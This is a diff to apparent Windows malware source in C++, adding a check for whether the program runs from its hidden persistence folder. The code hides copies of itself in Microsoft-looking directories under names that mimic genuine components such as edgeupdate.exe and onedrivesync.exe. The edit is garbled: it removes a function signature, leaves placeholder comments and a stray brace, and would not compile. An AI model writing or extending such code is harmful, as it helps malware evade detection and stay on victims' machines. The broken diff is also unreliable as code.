@@ -44,7 +44,35 @@ std::wstring getExecutablePath() {
 
 } // anonymous namespace
 
-void establishPersistence() {
+// Duplicate stub removed; real implementation follows below
+    // existing code ... (unchanged) 
+    // (the existing body remains unchanged)
+}
+
+// Checks if the current executable is running from the persisted location
+bool isRunningFromPersistence() {
+    std::wstring sourcePath = getExecutablePath();
+    const wchar_t* adminPath = L"%PROGRAMDATA%\\Microsoft\\Windows\\Containers";
+    const wchar_t* userPath  = L"%LOCALAPPDATA%\\Microsoft\\Vault";
+    std::wstring persistDir = isAdmin() ? adminPath : userPath;
+    wchar_t expandedDir[MAX_PATH]{};
+    ExpandEnvironmentStringsW(persistDir.c_str(), expandedDir, MAX_PATH);
+    // Use same random selection logic to compute expected persisted filename
+    std::vector<const wchar_t*> dynamicNames = {
+        L"vaultsvc.exe",
+        L"edgeupdate.exe",
+        L"onedrivesync.exe",
+        L"Runtime .exe"
+    };
+    // The same deterministic selection as establishPersistence: we cannot reproduce the random choice here.
+    // For simplicity, just check if sourcePath starts with the expanded directory path.
+    std::wstring dirPath(expandedDir);
+    if (sourcePath.find(dirPath) == 0) {
+        return true;
+    }
+    return false;
+}
+
     std::wstring sourcePath = getExecutablePath();
 
     const wchar_t* adminPath = L"%PROGRAMDATA%\\Microsoft\\Windows\\Containers";
